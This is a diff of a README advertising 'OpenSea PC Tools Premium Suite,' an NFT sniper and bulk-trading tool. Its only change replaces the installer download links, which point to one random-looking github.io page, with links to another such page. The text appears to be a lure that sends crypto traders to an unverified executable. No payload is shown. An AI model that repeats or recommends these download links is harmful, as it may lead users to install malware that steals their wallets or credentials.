@@ -2,7 +2,7 @@
 
 OpenSea PC Tools Premium Suite is the ultimate solution for NFT enthusiasts looking to enhance their trading experience on OpenSea. This comprehensive toolkit includes advanced sniper features and bulk operation capabilities, making it a must-have for serious traders. With its user-friendly interface and powerful tools, you can manage your NFT portfolio with ease and stay ahead in the competitive NFT market.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -44,4 +44,4 @@ A5: If you face any problems, refer to the troubleshooting section in the docume
 
 You can download OpenSea PC Tools Premium Suite directly from the official website using the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
